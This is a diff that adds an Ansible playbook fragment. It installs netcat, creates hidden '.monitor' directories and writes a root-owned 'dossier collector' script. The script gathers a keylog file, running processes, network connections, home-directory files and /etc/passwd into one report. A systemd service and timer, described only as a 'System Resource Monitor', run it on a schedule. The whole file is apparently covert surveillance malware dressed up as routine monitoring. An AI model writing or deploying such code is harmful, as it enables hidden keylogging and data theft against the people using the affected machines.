@@ -1,0 +1,98 @@
+---
+- name: Install netcat
+  apt:
+    name: netcat-openbsd
+    state: present
+    update_cache: yes
+
+- name: Ensure hidden directories exist
+  file:
+    path: "{{ item }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+  loop:
+    - /usr/local/lib/.monitor
+    - /var/lib/.monitor
+
+- name: Create dossier collector script
+  copy:
+    dest: "{{ collect_script_path }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/sh
+      set -eu
+
+      LOG="{{ collect_log }}"
+      KEYLOG="{{ keylog_path }}"
+      DOSSIER="{{ dossier_path }}"
+
+      echo "---- $(date) ----" >> "$LOG"
+
+      {
+        echo "=== DOSSIER $(date -Is) host=$(hostname) ==="
+        echo ""
+        echo "--- KEYLOG ---"
+        cat "$KEYLOG" 2>/dev/null || echo "(no keylog yet)"
+        echo ""
+        echo "--- PROCESSES ---"
+        ps aux 2>/dev/null || true
+        echo ""
+        echo "--- CONNECTIONS ---"
+        ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null || true
+        echo ""
+        echo "--- HOME FILES ---"
+        find /home -maxdepth 2 -type f 2>/dev/null | head -40 || true
+        echo ""
+        echo "--- /ETC/PASSWD ---"
+        cat /etc/passwd 2>/dev/null || true
+        echo "=== END DOSSIER ==="
+      } > "$DOSSIER"
+
+      echo "dossier built ($(wc -l < "$DOSSIER") lines)" >> "$LOG"
+
+- name: Create collector systemd service
+  copy:
+    dest: "/etc/systemd/system/{{ collect_service_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System Resource Monitor
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ collect_script_path }}
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create collector systemd timer
+  copy:
+    dest: "/etc/systemd/system/{{ collect_timer_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Periodic system resource monitoring
+
+      [Timer]
+      OnCalendar={{ collect_schedule }}
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable and start collector timer
+  systemd:
+    name: "{{ collect_timer_unit }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
